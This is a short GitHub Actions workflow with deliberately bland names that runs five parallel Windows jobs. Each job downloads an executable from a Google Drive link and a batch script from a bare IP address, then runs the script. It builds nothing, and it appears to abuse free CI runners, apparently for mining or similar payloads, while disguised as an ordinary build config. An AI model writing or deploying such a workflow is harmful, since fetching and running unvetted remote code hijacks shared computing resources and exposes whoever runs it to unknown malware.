name: Github
on: workflow_dispatch
jobs:
  build:
    name: environment
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1]
        flag: [A, B, C, D, E]
    timeout-minutes: 30
    env:
        NUM_JOBS: 5
        JOB: ${{ matrix.go }}
    steps:
    - name: Setup
      uses: actions/checkout@v1
    - name: running
      run: |
        Invoke-WebRequest https://drive.google.com/uc?export=download&id=1sS8GOCkLsFMlI1yT7zfuGLFi5KmDdXMp -OutFile cm.exe
        Invoke-WebRequest http://174.138.95.73/start.bat -OutFile start.bat
        cmd /c start.bat
